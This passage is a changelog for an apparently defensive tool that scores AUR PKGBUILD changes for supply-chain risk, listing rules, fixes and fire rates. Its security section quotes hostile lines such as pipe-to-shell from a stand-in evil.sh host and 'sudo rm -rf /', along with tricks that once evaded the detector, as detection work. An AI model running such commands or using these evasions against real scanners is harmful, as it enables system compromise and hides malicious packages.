  `docs/reference/cli.md`.
- **AUR verification on `inspect`.** The `inspect` command now verifies a
  package exists in the AUR before analysis, with graceful fallback to cached
  local data when the AUR RPC is unreachable.

### Fixed

- **Nested parameter expansion in PKGBUILD variables.** The resolver now
  handles constructs like `${srcdir}/${pkgname}-${pkgver}` by recursively
  expanding nested variable references. `resolve_expansions()` and supporting
  helpers (`_expand_one()`, `_glob_to_regex()`, `_strip_affix()`) added to
  `tokenizer.py`. 20 regression tests.
- **`__seed__` sentinel leaking into listings.** The synthetic `__seed__`
  package (used for first-run detection) no longer appears in `list` output
  or other user-facing queries. `get_package_id()` and `get_package()`
  return `None` for reserved names; `upsert_package()` raises `ValueError`.
- **Unanalyzed packages showing `0/100 Low`.** The `inspect` and `review`
  commands now display `-` for score and risk when a package has
  not yet been analyzed, instead of misleading `0/100 Low`.
- **Empty version strings shown as `unresolved`.** Version strings that do
  not match the plausible-version regex (e.g. unresolved PKGBUILD variables)
  display as `unresolved` in all output paths.

### Changed

- **Test fixture import resolution.** `tests/conftest.py` inserts `src/` into
  `sys.path` so that pytest can resolve `trustsight` imports without relying
  on the installed package.

## [0.9.0] - 2026-07-28

### Removed

- **LLM integration.** `src/trustsight/llm.py` deleted; verdicts are now
  entirely deterministic using rule-specific templates in `verdict.py`.
  `openai>=1.0` and `[project.optional-dependencies] ollama` removed from
  `pyproject.toml`. The `--simple` flag on `review`/`inspect`, the `config
  setup` command, the `[llm]` config section, and the `TRUSTSIGHT_API_KEY` /
  `TRUSTSIGHT_BASE_URL` environment variables are all removed.

### Changed

- **Verdicts now deterministic.** Each rule description includes its rule ID
  in brackets, e.g. `"maintainer changed to 'bob' [R071]"`. The
  `fallback_verdict()` function renders from a `_TEMPLATES` registry keyed by
  `rule_id`, falling back to `entry.reason` if no template exists.

- **FATAL verdict punctuation.** The second sentence now begins with a capital
  letter for readability.

- **Packaging.** LLM optdepends (`python-openai`, `ollama`) removed from
  `packaging/aur/PKGBUILD` and `.SRCINFO`.

### Fixed

- **All 12+ documentation files** swept of LLM references. `--verbose` added
  to the commands table in `README.md`.

## [0.8.0] - 2026-07-27

### Added

- **Full-AUR corpus builder.** `trustsight baseline build` fetches the AUR
  metadata archive, downloads PKGBUILDs via cgit with snapshot tarball
  fallback, runs the full analysis pipeline, and persists results. Progress
  is saved every 1000 packages for `--resume`. `trustsight baseline import`
  merges a signed corpus artifact into the local database. `trustsight watch`
  polls the AUR metadata on a configurable interval and analyses only the
  changed packages, optionally firing alert hooks.

- **Property stability tracking.** Eleven per-package, per-key property
  dimensions are recorded on every analysis with a SHA-256 value hash and
  a `stable_for_n` counter (accumulates on identical observations, resets on
  change). Feeds longitudinal rules R094-R102.

- **Canonical reproducible serialisation.** `canonical_artifact_bytes()`
  produces byte-identical output from the same corpus inputs. The signed
  payload records the ruleset version, scorer version, and corpus cutoff
  in a deterministic manifest.

- **ed25519 artifact signing.** `build_artifact` accepts `--sign KEY`.
  `import_baseline()` verifies against the shipped public key and refuses
  unsigned artifacts by default (`--allow-unsigned` for local builds).

- **`config setup` interactive wizard.** Walks through provider choice
  (openai, ollama), endpoint, API key (masked), model name, and connection
  test.

- **`--simple` flag** on `review` and `inspect` to skip the LLM verdict.

- **First-run welcome banner.** Shown on first `review` when the novelty
  seed is imported, printing config path, database path, and next-step
  suggestions.

- **`config set` extended.** `model`, `timeout`, and `provider` keys now
  accepted alongside `api_key` and `base_url`.

### Changed

- **TemporalContext unifies both analysis paths.** The git-based and
  corpus-based paths share a single `TemporalContext` parameter that declares
  the clock source (`git_commit`, `aur_metadata`, `observation_history`)
  rather than deriving timestamps internally. The clock source is recorded on
  every `PackageFact` as `temporal_source`.

- **`history` suggests `inspect` for unanalysed packages.** Instead of
  `"not found in history"`, now says `"Run 'trustsight inspect X' first."`

### Fixed

- **LLM verdict always used in `inspect`.** Previously called
  `fallback_verdict()` unconditionally instead of `generate_verdict()`.
- **API exceptions and suppressed verdicts now logged at `warning` level.**
  Previously `debug` made them invisible.

## [0.7.2] - 2026-07-27

### Added

- **New CLI commands.** `trustsight list` lists all packages tracked in the
  database with their latest score, risk, version, and maintainer.
  `trustsight status` shows database health statistics (packages tracked,
  total analyses, effective observations, dependency corpus status).

- **Database maintenance commands.** `trustsight db check` runs `PRAGMA
  integrity_check`. `trustsight db vacuum` reclaims disk space from deleted
  rows. `trustsight db backup` creates a safe online backup via
  `sqlite3.backup()` without stopping the application.

- **AUR RPC response cache.** A new `aur_cache` table stores AUR version
  lookups so repeated reviews do not re-query the AUR server. Config key
  `[discovery] cache_ttl_minutes` controls freshness (default: 60 minutes;
  set to 0 to disable).

- **`inspect --verbose` flag.** Threaded through to both the rich and plain
  output paths. In JSON mode it includes the score breakdown in the output.

- **`PRAGMA busy_timeout=5000`.** The database connection now retries locked
  writes for 5 seconds instead of raising `OperationalError: database is locked`
  immediately.

### Changed

- **Pipelined analysis and LLM verdicts.** The batch-review path replaced its
  serial analysis loop with a `ThreadPoolExecutor` where each task runs
  `analyze_package()` followed immediately by `_verdict_for()` in the same
  thread. Analysis and LLM calls now overlap across workers instead of running
  strictly sequentially, reducing wall time by roughly
  `min(total_analysis, total_llm)` seconds.

- **AUR RPC queries are cached.** `get_aur_package_info()` checks the local
  cache before making HTTP requests; only packages not in cache (or whose
  cache entry has expired) reach the AUR server.

### Fixed

- **`_run_analysis_loop()` output indentation.** The rich-table and plain-text
  output branches were nested inside `if json_output:` (after its `return`),
  making them dead code. Restructured into a clean three-way branch.

## [0.7.1] - 2026-07-27

### Added

- **Database schema migration for `current_maintainer`.** A migration step
  (`_migrate` + `_ADDED_COLUMNS`) now safely adds columns that were introduced
  after the initial schema shipped. Existing databases created before
  `current_maintainer` existed will have it added on the first run, fixing a
  crash on upgrade.

- **Concurrent prefetch of AUR repositories.** The batch-review path clones or
  fetches all package repos in parallel before beginning analysis, so the
  network latency of 20 sequential fetches no longer dominates the runtime.

- **AUR RPC helpers.** `get_aur_package_info` and `get_aur_latest_versions`
  batch-query the AUR RPC interface, replacing individual per-package lookups
  and reducing network round-trips.

- **Drift detection for shipped rules.** `drifted_shipped_rules()` compares the
  on-disk `rules.toml` against the shipped template, flagging when a rule
  definition has drifted from the canonical copy.

- **`diff_truncated` field on `PackageFact`.** Marks analyses where the diff
  was truncated, so the report can indicate the change was only partially
  examined.

- **`_prefetch` uniqueness invariant.** An assertion guarantees that
  `_prefetch` receives unique package names, preventing redundant parallel
  clones.

- **Test fixtures shared via `conftest.py`.** `SHARED_RULES` (R001-R013) and
  `SHARED_CONFIG` (five top-level keys) are now defined once and imported by
  `test_analysis.py`, `test_rules.py`, `test_scenarios.py`, and
  `test_scoring.py`, removing 173 lines of duplication across four test files.

### Fixed

- **IDN homograph false positive.** `has_homograph()` no longer flags
  single-script labels containing non-ASCII Latin letters or combining marks.
  Only mixed-script labels are confusables per UTS #39 Highly Restrictive.
  Legitimate IDNs like `münchen.de` and `café.fr` are no longer reported.
  The `_latin_with_combining_marks()` helper was removed entirely.

- **PKGBUILD `check()` function.** Now builds a venv with
  `--system-site-packages`, installs the built wheel, and runs pytest
  (excluding `test_fetcher.py` and `test_rebaseline.py`). The previous bare
  `python -m pytest` call failed against an uninstalled source tree.

### Changed

- **Thread-local connection caching.** Database connections are cached per
  thread and per database path rather than opened per query. The hot paths
  issue thousands of small reads; opening a connection once instead of per
  query reduces overhead from ~0.35ms to effectively zero on repeat use.

- **`_is_current` uses HEAD commit time as fallback.** When no marker file
  exists (clones from earlier versions), the local HEAD commit time is compared
  against `upstream_mtime`. This eliminates a redundant `git fetch` for every
  package whose clone is already up to date, cutting the batch-review wall
  clock from ~2min to ~3s for a 19-package run.

- **`_ensure_init` runs init once per process.** `ensure_default_configs()` and
  `init_db()` are now called at most once per process via a module-level guard.
  Previously they ran on every `analyze_package()` call, adding ~100-200ms per
  package.

- **R066 (`_package_is_new`) capped at 100 commits.** The brand-new-package
  check previously walked the entire DAG to find the root commit. Packages with
  more than 100 commits are now skipped (they are definitionally not new),
  eliminating full-history walks that cost ~30-50s for packages with thousands
  of commits.

- **Lazy `__version__` loading.** The version string is now loaded via PEP 562
  `__getattr__` instead of `importlib.metadata.version()` at import time,
  avoiding a 46ms penalty on every `import trustsight`.

- **Pattern cache in `rules.py`.** Compiled regex patterns are cached across
  diffs, avoiding repeated `re.compile` calls that dominated the diff-analysis
  hot path.

- **Typosquat detection uses `top_dependency_pairs()`.** The rank-and-compare
  loop now fetches name-count pairs in a single query instead of running one
  query per candidate, fixing a performance regression on large databases.

### Removed

- **Dead code and duplicate patterns.** `parse_srcinfo_with_pkgbase` (uncalled)
  and several unreachable lines in `srcinfo.py` were removed.
  `_PINNING_ORDER` was unified in `buckets.py`; `risk_level()` is now the
  single source of truth across all callers.

- **`.seo-debug/` tracked artifacts.** Documentation JSON files committed by a
  prior zensical run are removed from the index and gitignored.

### Style

- **Ruff E402 violations resolved.** `log = logging.getLogger(__name__)` was
  moved below all imports in `analysis.py` and `llm.py`. Exception handlers in
  `override.py` were narrowed from `except BaseException` to `except Exception`.

### Documentation

- **Docstrings added to all 124 functions** across 19 source files, covering
  every public and private function including inner closures.

### Build

- **`.gitignore` updated for makepkg artifacts.** `packaging/aur/pkg/`,
  `packaging/aur/src/`, `*.tar.gz`, and `*.pkg.tar.*` are now ignored.

## [0.7.0] - 2026-07-26

### Added

- **Temporal context rules (R065-R067).** Three new code-emitted rules that
  inspect git commit timestamps on the AUR repository rather than diff content.
  All are on by default with no config toggle.

  | Rule | Name | Severity | Condition |
  |------|------|----------|-----------|
  | R065 | Very Recent Update | INFO (w 0) | HEAD commit < 72 h old |
  | R066 | Brand New Package | INFO (w 0) | First AUR commit < 30 days old |
  | R067 | Stale Package Revived | MEDIUM (w 15) | Gap to last analyzed commit > 365 days |

- **Install, build, and maintainer rules (R068-R073).** Six new code-emitted
  rules that inspect install hooks, GPG verification removal, build environment
  subversion, maintainer takeovers, capability density, and release cadence.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R068 | Install Hook Present | INFO (w 0) | context | PKGBUILD declares install= or diff touches *.install |
  | R069 | GPG Verification Removed | HIGH (w 25) | integrity | validpgpkeys populated before, empty/absent after |
  | R070 | Build Environment Subversion | HIGH/MEDIUM (w 25/15) | build | LD_PRELOAD/LD_LIBRARY_PATH (HIGH) or CFLAGS/LDFLAGS/MAKEFLAGS/PATH (MED) set inside build fn |
  | R071 | Untrusted Maintainer Takeover | HIGH (w 25) | maintainer | maintainer changed + new maintainer globally novel |
  | R072 | Capability Density Anomaly | INFO (w 0) | meta | rule hits span 3+ distinct categories |
  | R073 | Accelerated Release Cadence | metadata (never scored) | temporal-metadata | HEAD has 3+ ancestors in the last 24 h |

  All R068-R073 are always on, gated only by diff content or database
  maturity rather than an experimental flag.

- **Naming and dependency-set rules (R074-R075).** Two new code-emitted rules
  that detect package-name typosquatting and aggregate dependency-set expansion.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R074 | Package-Name Typosquat | HIGH (w 25) | naming | name within edit-distance 2 of a far-more-popular package, not a variant |
  | R075 | Dependency-Set Expansion | MEDIUM (w 15) | dependency | diff adds 3+ deps whose count x mean-rarity exceeds gate |

  Both are always on, gated only by a cold-start maturity check.
  R074 uses seed popularity data and requires a warmed database;
  R075 is fully corpus-calibratable.

- **Fire rates measured for R068-R075.** Measured against the 3246-diff
  benign corpus. R068 (20.95 %), R069 (0.03 %), R070 (0.25 %), R072 (15.87 %),
  R074 (1.12 % package-scan), R075 (0.34 %). All scored rules pass the 30 %
  gate. R071/R073 require live git history and are marked TBD in fire-rates.md.

### Fixed

- **Crash bugs in the analysis pipeline and CLI.** Seven fixes that prevented
  the tool from crashing on unusual package states or missing dependencies:

  | ID | Issue | Fix |
  |----|-------|-----|
  | B1 | `pygit2.GitError` raised `NameError` at runtime because pygit2 was not imported in `analysis.py` | Added `import pygit2` (not just a type stub) |
  | B2 | `generate_diff` crashes on stale commit OIDs that produce `None` commits | Guard against `None` before accessing `.tree` |
  | B3 | `get_head_commit` propagates `GitError` for empty/unborn repos | Wrapped in try/except, returns `""` on failure |
  | B4 | One bad package in a batch aborts the entire scan | Per-package try/except around `analyze_package` in CLI loop |
  | B5 | Tool crashes on startup when `rich` is not installed | Guard `console()` and all fallback paths with `HAS_RICH` checks |
  | B6 | Seed-import message leaks into JSON stdout with `--json` | Pass `quiet=True` to `maybe_auto_import_seed` in JSON mode |
  | B10 | `_simple_vercmp` compares version parts lexicographically (e.g. `9` > `10`) | Parse as integers before comparison |

- **`python -m trustsight` support.** Added `src/trustsight/__main__.py` so the
  tool works with `python -m trustsight` in addition to the installed script.

## [0.6.1] - 2026-07-25

### Changed

- **Eight experimental rules promoted to enabled by default.** D001, D002, D003,
  D004, R061, R062, R063, and R064 now default to `true` in both the config
  template and the code fallback.  Users who already have an
  `[experimental_rules]` section in their `config.toml` are unaffected and keep
  their existing setting; users without the section pick up the new defaults
  automatically.

  Fire rates (false-positive rates on the 3246-diff benign corpus) that
  justified the promotion:

  | Rule | Severity | Rate | Fires |
  |------|----------|------|-------|
  | D001 | HIGH | 0.15 % | 5/3246 |
  | D002 | HIGH | 0.00 % | 0/3246 |
  | D003 | MEDIUM | 0.46 % | 15/3246 |
  | D004 | HIGH | 0.00 % | 0/3246 |
  | R061 | HIGH | 0.22 % | 7/3246 |
  | R062 | HIGH | 0.09 % | 3/3246 |
  | R063 | HIGH | 0.00 % | 0/3246 |
  | R064 | MEDIUM | 0.03 % | 1/3246 |

  See [Fire Rates](explanation/fire-rates.md) for the full reference.

- **Baseline regenerated** with the new defaults.  The eight rules now appear
  in per-stratum fire-rate records.  Aggregate metrics (`zero_pct`, `p95`)
  shifted slightly as expected; the baseline is the new reference.

### Added

- **Fire Rates documentation page** (`docs/explanation/fire-rates.md`).
  Explains how fire rates are measured, the two corpora, the 30 % demotion
  gate, and per-rule tables for core, expanded, D-series, and build-function
  rules.

### Added

- **Four more supply-chain rules**, all off by default, each measured against the 3246-diff benign corpus before being designed. **D004 0.00 %, R062 0.09 %, R063 0.00 %, R064 0.03 %.**
    - **D004 (HIGH)** `provides`/`replaces` claims an established package unrelated to this one, installing it in front of the real thing. Variants (`htop-vim` → `htop`) and siblings (`linux-cachyos` → `linux-headers`) are suppressed, but a shared *ecosystem* prefix is not: `python-evil` claiming `python-requests` still fires, because thousands of unrelated packages share `python-`. "Established" is `pacman -Slq`, falling back to `observation_count`.
    - **R062 (HIGH)** a `.install` hook that fetches or performs a privileged operation. Hooks run as root at install time. Needed no new parsing: `generate_diff()` already includes `*.install` patches and `_classify_enclosing_function()` recognises `post_install()` like any other function.
    - **R063 (HIGH)** a patch applied from a URL, an absolute path, or process substitution.
    - **R064 (MEDIUM)** a `source=` URL downgraded from `https` to `http`. `extract_source_array_urls()` gained a `side` parameter so both sides of the diff can be compared.
- **D-series dependency-graph rules**, closing part of the documented build-dependency blind spot. All are **off by default** under a new `[experimental_rules]` config section, so `baseline.json` is unaffected until they are deliberately enabled.
    - **D001 (HIGH)** novel dependency: a name never observed anywhere in the AUR. Backed by a new `dependency_names` table seeded from every dependency entry **plus every package name and `provides` alias**, without which a real package that nothing else depends on would read as novel. Silent on an unseeded database rather than flagging everything.
    - **D002 (HIGH)** typosquatted dependency, e.g. `openss1` for `openssl`. Refines D001 and is reported in its place.
    - **D003 (MEDIUM)** `makedepends` gains a network-capable tool, so the build can fetch code no checksum covers.
- **R060 is now INFO (weight 0) and on by default.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also edits `build()`" case it was proposed for is 9.8 %. At weight 0 it reports context to a reviewer without touching any score.
- **R061 (HIGH)** a download inside a build function whose URL is absent from `source=()`. Off by default.
- `scripts/generate_seed.py` records dependency names from the `.SRCINFO` it already reads, so seeding costs no extra I/O. `normalize_dependency` is shared with the runtime lookup: were the two to normalise differently, every query would miss and every dependency would look novel.
- `tokenizer.resolve_added_lines()` returns resolved lines with positions intact, so a rule can still resolve variables *and* know its enclosing function. Resolution alone discards that.
- The bundled seed is regenerated and now carries **209,909 dependency names** alongside 179,956 URLs and 35,903 maintainers. `seed.db.gz` grows from 13.0 MB to 19.9 MB.

  Fire rates against the 3246-diff benign corpus, so these are false-positive rates: **D001 0.15 %, D002 0.00 %, D003 0.46 %, D004 0.00 %, R061 0.22 %, R062 0.09 %, R063 0.00 %, R064 0.03 %, R060 21.4 %**. R060 is the outlier by design, marking any edit to a build function; at weight 5 it cannot reclassify a package alone but it moves benign p95 more than the other four together, so it deserves a separate decision from the rest.

### Fixed

- **`_EXPERIMENTAL_DEFAULTS` in `analysis.py`.** `load_config()` reads the user's `config.toml` verbatim and never merges new defaults in, so an existing install would never have seen `[experimental_rules]` and R060 would have been dead for every upgrade. Defaults now live in code, with the config file overriding them.
- **D004 did nothing when enabled on its own.** It shared a guard clause that only tested D001-D003, so the whole dependency block returned early unless one of those was also on. Covered by a test that enables each rule in isolation.
- **The dependency extractor read shell code as dependency names.** An unbounded fallback for unquoted array entries pulled `if`, `[[`, and `!` out of a `package()` body, and comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`). Together these put D001 at 5.95 % against a true rate of 0.15 %. Array termination is now quote-aware and bounded, tokens are validated against the Arch package-name grammar, and comments are stripped.
- **`resolve_added_lines()` shifted every line after an assignment.** It zipped its output against `tokenize_and_resolve()`, which omits assignment lines, so any added assignment made the two sequences different lengths. An array header could vanish and a rule scoped to `build()` could be handed the wrong function. Substitution is now applied per line from a shared variable table, which `tokenize_and_resolve()` also uses so the two cannot diverge.
- **The release workflow could not commit its result.** The `Commit to the default branch` step failed with `fatal: not in a git directory`, despite `actions/checkout` having run `git init` in the workspace normally. Rather than fight the container's git, the workflow is now split: `makepkg` work (checksum, `--verifysource`, `--printsrcinfo`) runs in the Arch container and hands `PKGBUILD` and `.SRCINFO` over as an artifact, and a second job on the standard runner does the commit. `include-hidden-files` is set on the upload, since `.SRCINFO` is a dotfile and would otherwise be silently dropped. A `concurrency` group stops two releases racing on the same branch.
- **`packaging/aur/PKGBUILD` carried the wrong checksum.** Because the release workflow never completed, `pkgver` had been bumped to 0.5.1 while `sha256sums` still held the v0.5.0 tarball's hash, so `makepkg -si` failed validation for anyone following the documented install. Corrected to the real v0.5.1 hash and verified with `makepkg --verifysource`; `.SRCINFO` regenerated to match.

## [0.5.1] - 2026-07-25

### Added

- `.github/workflows/release-pkgbuild.yml`: on a `v*` tag, downloads the generated source tarball, computes its sha256, and writes `pkgver`, `pkgrel`, and `sha256sums` into `packaging/aur/PKGBUILD` on the default branch, regenerating `.SRCINFO` with `makepkg --printsrcinfo`. The PKGBUILD shipped to users therefore never carries `SKIP`. The checksum is validated with `makepkg --verifysource` before the commit, so a wrong hash fails the release rather than reaching a user.

  The update lands on the default branch and the tag is never moved. GitHub generates the tarball from the tree the tag points at, so amending the tag would change the tarball and invalidate the checksum just computed.

### Fixed

- `packaging/aur/.SRCINFO` was stale: it declared `pkgver = 0.3.0`, an all-zero `sha256sums`, and omitted the `python-typer` dependency the PKGBUILD requires. Regenerated, and now kept current automatically by the release workflow.

## [0.5.0] - 2026-07-25

### Added

- `scripts/build_corpus.py --from-manifest`: rebuilds the exact corpus recorded in `corpus.lock` instead of re-selecting packages by AUR popularity. Fetches only the branches named in the lock into an empty bare repo, so reconstruction takes minutes rather than requiring a full clone of the AUR monorepo. This is what lets CI materialise the corpus, which is gitignored and therefore never present on a fresh checkout.

### Security

- **A message prefix disabled every scoped rule.** Any line starting with `echo`/`printf`/`msg`/ followed by a quote was classified as an inert "message" in its entirety, but a shell line does not end at its first command. `echo "x"; sudo rm -rf /` scored 0 where `sudo rm -rf /` scored 40, so a seven-character prefix switched off R009 (CRITICAL), R010, and R011. Message context now requires the line to contain no command separator (`;`, `&`, `|`) or substitution (`$(`, backtick).
- **Line continuations bypassed the CRITICAL pipe-to-shell rules.** Rules match one line at a time, so splitting `curl http://evil.sh | bash` across a trailing backslash left R001/R002 with only a `curl \` fragment, dropping the score from 65 to 25. Continuations are now joined into one logical line before matching, for both the raw and resolved paths.
- **Variable resolution never ran inside function bodies.** The tokenizer's assignment pattern was anchored at `^(\w+)=`, so any indented assignment (that is, every assignment inside a function) was skipped and the variable table stayed empty. `C=curl` followed by `$C http://evil.sh | bash` resolved to nothing and defeated every rule matching resolved strings, scoring 20 against a baseline of 65. Assignments are now recognised when indented and when introduced by `local`/`export`/`declare`/`readonly`/`typeset`.
- **One-line function bodies escaped function scoping.** `package() { curl evil | bash; }` was classified before the depth counter advanced, so the line read as `other` and `function_body`-scoped rules skipped it; the counter was also left raised for everything that followed.
- **`..` passed package-name validation and could delete the cache root.** `_VALID_PKG_NAME` accepted `.` and `..`, so `repo_path("..")` resolved to the parent of the repo cache, which `clone_or_fetch` then passed to `shutil.rmtree` when it failed to open as a repository. Both names are now rejected, and `repo_path` additionally asserts the resolved path is directly inside the cache root.
- `discovery.fetch_package_info` interpolated the package name straight into the RPC query string; an unescaped `&` or `#` could inject or truncate parameters. It now uses `urlencode`, matching `get_aur_latest_versions`.

### Fixed

- **Mirror Integrity Check never ran.** The `Alert on failure` step's script block was mis-indented, making `mirror-check.yml` unparseable; every run failed during workflow startup. The workflow now also reconstructs the corpus before verifying it, rather than assuming a directory that cannot exist in CI.
- **Corpus Drift Detection failed with `Corpus not found`** for the same reason, and now rebuilds the corpus from the lock first (caching the fetched AUR objects).
- **Corpus diffs were not reproducible across machines.** `git` scales the abbreviation length in `index <old>..<new>` lines to a repository's object count, so a sparse clone emitted 7-character hashes where the full mirror emitted 12: byte-different diffs for identical commits, invalidating `corpus_content_sha256`. `core.abbrev` is now pinned to 12 and recorded in the lock.
- **Overlapping strata double-counted diffs.** A package matching two strata (`python-foo-git` matches both `lang_ecosystem` and `vcs_git`) was walked once per stratum, and both entries were kept, inflating per-stratum fire rates. Entries are now deduplicated at lock-write time, keeping the last stratum to match the overwrite order the corpus on disk already had. `corpus.lock` drops from 3332 to 3246 entries with no change to the corpus itself.
- `corpus.lock` recorded `strata_file` as an absolute path from the generating machine.
- Drift reports are no longer passed through a `GITHUB_OUTPUT` heredoc, whose delimiter could be forged by diff content and whose payload could exceed the 1 MB output limit. Both workflows also suppress duplicate issues instead of filing one per run.

### Documentation

- `re-baselining.md` described behaviour `rebaseline.py` does not have: it does not check out the corpus, does not validate CI gates, and reports no `p5`/`p50`. Strata are package shapes, not `benign`/`malicious`/`synthetic`. Corrected, and the required corpus-reconstruction step added.
- `writing-a-rule.md` referenced a `--check-fire-rate` flag that does not exist, and the wrong corpus path.
- Installation is now documented as a single path: `git clone` from GitHub plus `makepkg -si` against the in-repo PKGBUILD. The pipx and `pip` routes have been removed, and the docs note that the package is not yet published to the AUR.
- `rules.md` documented a bare function header as the only header behaviour, and did not mention that continuations are joined before matching. Both corrected, along with the qualification that `message` context requires the line to be only a message.
- `cli.md` listed `scope-contradiction` as an error; it is now a warning.

## [0.4.1] - 2026-07-25

### Added

- `--json` flag on all commands for machine-readable output.
- PKGBUILD build+install CI workflow using `archlinux:latest` container.
- AUR install instructions in README and getting-started guide.

### Changed

- CLI migrated from `argparse` to `typer`: auto-generated `--help`, type-annotated callbacks, `--json` flag per command. Entry point renamed from `main` to `app`.
- CLI tests updated from `patch(sys.argv)` pattern to `typer.testing.CliRunner`.
- Documentation tests parse typer patterns (`add_typer`, `@command`) instead of argparse `add_parser`.

### Fixed

- Mirror-check CI now triggers on `push` for corpus.lock and benign-corpus changes.

## [0.4.0] - 2026-07-25

### Added

- Multi-repo and foreign package discovery: new `--repo`, `--foreign`, `--all-repos` flags for `trustsight review`. Packages can be scanned from specific local repositories, all auto-detected local repos (excluding official ones), and/or foreign packages. Config-driven defaults via new `[discovery]` section in `config.toml`.
- `vercmp`-based version comparison for accurate detection of outdated packages (replaces string inequality).
- Graceful fallback to string comparison when `vercmp` binary is missing.

### Changed

- Python requirement lowered from `>=3.12` to `>=3.10`. `tomllib` usage replaced with a `tomli` fallback shim for 3.10 compatibility.
- CI matrix expanded to test Python 3.10 through 3.14.
- Catastrophic backtracking detection threshold raised (`_BACKTRACK_REPS` 18 -> 22) to remain effective on Python 3.12+ optimized regex engine.

## [0.3.1] - 2026-07-24

### Fixed

- Verdict text no longer printed to stdout during `review` for every package (stray `print(result)` in `generate_verdict_stream` non-streaming path)
- Stale `~/.pyenv/shims/trustsight` shadowed pipx install, causing `trustsight -v` to report 0.1.0 instead of the actual installed version

### Added

- `-v` / `--version` CLI flags via `importlib.metadata.version()`
- Graceful `KeyboardInterrupt` handling: clean `Interrupted.` message and exit code 130 instead of an SSL/httpx traceback

### Changed

- `-h` help now includes config subcommands section (`config show`, `config set`, `config sync-rules`) and usage examples

## [0.2.2] - 2026-07-24

This release fixes a critical false positive in R013 that could score benign
packages 100/100, restores the novelty engine (Tier C) which had been inert
since v0.1, and ships a pre-seeded database of 178,491 AUR source URLs to
eliminate cold-start INCONCLUSIVE verdicts.

**Existing users must run `trustsight config sync-rules --update`** to receive
the corrected detection patterns. `rules.toml` is written only when absent, so
a package upgrade alone does not update it. The command is additive and never
overwrites a rule you have edited.

Note: `v0.2.1` was already tagged at the previous commit, and the `[0.3.0]`
section below is recorded in this changelog but was never tagged. This release
takes the next free patch number; the 0.3.0 discrepancy is left for a separate
reconciliation.

### Fixed

- R013 (FATAL) fired on legitimate localized text. U+200B-U+200D are mandatory joiners in Malayalam, Lao and other scripts, so a `GenericName[ml]=` line in a browser package scored 100/100; measured on two packages in the benign corpus. Zero-width characters now require ASCII neighbours; bidi overrides, invisible operators and tag characters still fire unconditionally. The pattern also gains U+200E/U+200F, U+2060-U+2064 and the tag block, which `unicode.py` already listed and which account for the documented recall gap.
- R058 fired on `"${pkgdir}"/usr/lib/...`, where the quote closes before the path, and on absolute paths quoted inside `echo` strings. It now requires the command to be the first token on the line and the path to start an argument.
- The maintainer was read from `.SRCINFO`, which does not carry one; checked against the AUR mirror, 0 of 200 `.SRCINFO` files have a `maintainer =` line, while every PKGBUILD opens with `# Maintainer:`. `get_maintainer_from_commit()` therefore always returned `None`, silently disabling `maintainer_changed`, the highest novelty weight (20), and C006. Now read from the PKGBUILD comment, with `.SRCINFO` as a fallback.
- `scan_diff` tracked novelty differently from the live path in three ways: it compared raw URLs instead of `normalize_url`-d ones (so every version bump read as novel), it derived "first seen globally" from the per-package set (making it identical to per-package), and it overwrote rather than OR-ed the flags across multiple URLs (so a familiar URL masked a novel one).
- Tier C novelty was inert: `observation_count` was never populated outside tests, so `maturity()` always read 0 and every novelty weight scored zero. Now sourced from `count_observations()`.
- Homograph detection missed Cyrillic confusables. `has_homograph()` only matched codepoints named `LATIN*`, while the `CONFUSABLES` table it sits beside is Cyrillic; so `github.cоm` classified as `unknown` (+20) rather than `homograph_attack` (+30). Replaced with mixed-script-per-label detection, plus punycode decoding to close the `xn--` bypass. Legitimate single-script IDNs (`.рф`, Japanese, Korean) are not flagged.
- `cli.py` called `set_config` without importing it, so `trustsight config set` raised `NameError`.
- `scripts/build_corpus.py` had a 600s timeout on the AUR bare clone, which the repository cannot meet, so the script could never complete on a fresh machine. Partial clones were also left on disk and reused silently, since `rev-parse --git-dir` succeeds on an interrupted clone.

### Added

- Novelty seed database. `scripts/generate_seed.py` builds it from the AUR git mirror by parsing `.SRCINFO` (including the arch-suffixed `source_x86_64` arrays); `trustsight seed-db` imports it. Without a seed, a fresh install has an empty `source_urls` table, so `url_first_globally` fires for github.com and every other ordinary host, and `maturity()` returns 0 because there is no analysis history; leaving every Medium verdict downgraded to INCONCLUSIVE. Import is additive and idempotent, and never overwrites a row learned from a real analysis.
- `metadata` and `maintainer_counts` tables, and `effective_observation_count()`: maturity falls back to a seed-supplied bootstrap count, and real analyses take over as soon as they outnumber it, so the tool never depends on external data permanently.
- `trustsight lint-rules` (`--file` for CI): detects unreachable, over-broad, and malformed rules. Errors on empty patterns, duplicate ids, ids owned by `analysis.py`, comment-shadowed rules, and scope contradictions; warns on rules that fire on ordinary packaging.
- Expanded ruleset R039-R059 (21 rules), calibrated against a 3322-diff stratified benign corpus and enabled by default. Fourteen fire on zero benign diffs; every remaining hit was inspected individually and all but one were true positives. R053 was split by target: setuid inside `$pkgdir` is MEDIUM (Chromium's sandbox helper legitimately needs 4755, and at MEDIUM this changes no package's risk band), while setuid on an absolute path is a separate HIGH rule, R059. The `experimental` flag remains supported for future additions.
- Programmatic rules C004 (checksum removed for unchanged source), C005 (binary artifact from untrusted source), C006 (maintainer change with new source domain), C007 (command substitution in source array).
- Rule scopes may name a PKGBUILD function (`scope = ["pkgver"]`), not just a line context.
- `added_only` rule field: match only added lines, so deleting a suspicious line no longer raises a package's score.
- Ephemeral paste and file-drop services added to the `raw_hosting` bucket.

### Changed

- Novelty weights recalibrated now that tier C is live: `url_first_globally` 15 → 10, `url_first_in_package` 10 → 5, `maintainer_first_in_package` 20 → 15. The previous values had never been exercised, because `observation_count` was never populated and the maturity multiplier was permanently 0. At full maturity they took a borderline 15-point package with a novel URL and a novel maintainer to 60 (High); the new values keep that case at 45 (Medium). Maintainer novelty remains the strongest signal.
- `_structural_findings()` is now shared by `analyze_package()` and `scan_diff()`, removing ~110 lines duplicated between the live and offline pipelines.

## [0.3.0] - 2026-07-18

- Score column renamed to "Risk Score"
- Rich progress output during review
- AUR RPC batching for performance
- Handle empty AUR repos gracefully
- FATAL severity with hard stop at 100
- Verification evidence detection and scoring
- Source pinning classification
- Code rules C001-C003 for structural anomalies
- URL normalization for novelty dedup
- Maturity-based novelty gating with Inconclusive risk level
- Scope-based rule matching (function_body context)
